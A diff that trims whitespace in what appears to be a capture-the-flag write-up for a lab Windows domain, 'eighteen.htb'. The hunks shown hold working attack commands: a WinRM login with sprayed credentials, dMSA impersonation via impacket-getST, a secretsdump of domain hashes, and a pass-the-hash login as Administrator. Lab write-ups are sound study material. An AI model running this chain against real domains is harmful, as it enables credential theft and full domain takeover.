@@ -334,16 +334,14 @@ WINRM       10.129.3.186    5985   DC01             [+] eighteen.htb\adam.scott:
 A password spray attack against the WinRM service successfully identified valid credentials for the adam.scott account, with the "Pwn3d!" status indicating administrative-level access or the ability to execute commands remotely.
 
 ```bash
-evil-winrm -i 10.129.3.186 -u adam.scott -p 'il...u1'                                                        
-                                        
+evil-winrm -i 10.129.3.186 -u adam.scott -p 'il...u1'
 Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
-                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\adam.scott\Documents> 
+*Evil-WinRM* PS C:\Users\adam.scott\Documents>
 ```
 
 We find our first flag on user's desktop directory.
@@ -499,13 +497,13 @@ Fri Feb 20 09:43:20 AM UTC 2026
 Now, we can get the admin ticket.
 
 ```bash
-kali@kali:proxychains4 impacket-getST -impersonate 'Eight08_DMSA$' -dmsa 'eighteen.htb/adam.scott:il...u1' -self                   
+kali@kali:proxychains4 impacket-getST -impersonate 'Eight08_DMSA$' -dmsa 'eighteen.htb/adam.scott:il...u1' -self
 [proxychains] config file found: /etc/proxychains.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
@@ -538,7 +536,7 @@ kali@kali:proxychains4 impacket-secretsdump -k -no-pass -dc-ip 127.0.0.1 dc01.ei
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:445  ...  OK
 [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
@@ -561,13 +559,11 @@ We got the hash, now we can login.
 
 ```bash
 kali@kali:evil-winrm -i 10.129.3.186 -u Administrator -H 0b.....ec
-                                        
 Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
-                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 eighteen\administrator
